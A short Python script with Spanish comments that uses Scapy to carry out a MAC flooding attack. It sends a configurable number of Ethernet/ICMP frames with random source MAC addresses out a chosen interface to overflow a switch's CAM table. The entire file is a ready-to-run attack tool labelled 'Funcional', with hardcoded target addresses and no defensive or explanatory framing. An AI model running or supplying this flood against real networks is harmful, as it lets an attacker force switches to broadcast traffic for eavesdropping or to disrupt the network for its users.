#!/usr/bin/env python3
"""
MAC Flooding - Funcional
Inunda tabla CAM del switch con MACs aleatorias
"""

from scapy.all import *
import argparse
import random
import time

def generate_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255), random.randint(0,255)
    )

def mac_flood(interface, count, delay):
    print(f"[*] Iniciando MAC Flooding en {interface}")
    print(f"[*] Enviando {count} frames...")
    
    for i in range(count):
        src_mac = generate_mac()
        dst_mac = "00:11:22:33:44:55"
        
        frame = Ether(src=src_mac, dst=dst_mac, type=0x0800)/IP(src="14.2.0.10", dst="14.2.0.159")/ICMP()
        
        sendp(frame, iface=interface, verbose=0)
        
        if delay > 0:
            time.sleep(delay)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAC Flooding Script")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Cantidad de frames")
    parser.add_argument("-d", "--delay", type=float, default=0.0, help="Retraso entre frames")
    args = parser.parse_args()
    
    mac_flood(args.interface, args.count, args.delay)